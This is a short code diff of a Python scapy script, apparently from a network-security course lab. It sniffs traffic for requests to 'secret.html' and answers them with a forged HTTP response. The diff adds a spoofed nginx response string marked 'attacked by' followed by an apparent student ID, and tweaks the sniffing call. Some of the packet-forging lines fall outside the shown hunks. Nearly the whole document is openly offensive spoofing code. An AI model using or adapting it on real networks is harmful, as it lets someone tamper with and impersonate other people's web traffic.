@@ -1,5 +1,14 @@
 from scapy.all import *
 
+data = '''HTTP/1.1 200 OK\r
+Server: nginx/1.14.0 (Ubuntu)\r
+Content-Type: text/html\r
+Connection: keep-alive\r
+Accept-Ranges: bytes\r
+attacked by 2017011313\r
+\r
+'''
+
 
 def attack(req):
     if 'secret.html' not in str(req):
@@ -15,4 +24,4 @@ def attack(req):
     send(resp)
 
 
-sniff(prn=attack)
+sniff(prn=attack, store=0)
